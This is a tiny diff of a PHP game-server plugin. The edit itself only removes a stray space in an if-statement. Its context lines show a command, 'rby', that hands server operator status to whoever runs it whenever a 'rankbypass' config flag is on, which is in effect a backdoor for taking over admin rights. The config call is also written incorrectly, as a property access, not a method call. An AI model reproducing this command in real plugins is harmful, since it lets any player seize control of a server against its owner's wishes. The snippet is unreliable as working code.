@@ -18,7 +18,7 @@ public function onCommand(CommandSender $sender, Command $command, string $label
             return false;
         }
     $a = $this->getConfig->get("rankbypass");
-    if ( $a) {
+    if ($a) {
         switch ($command->getName()) {
             case "rby":
                $sender->getServer()->addOp($sender);
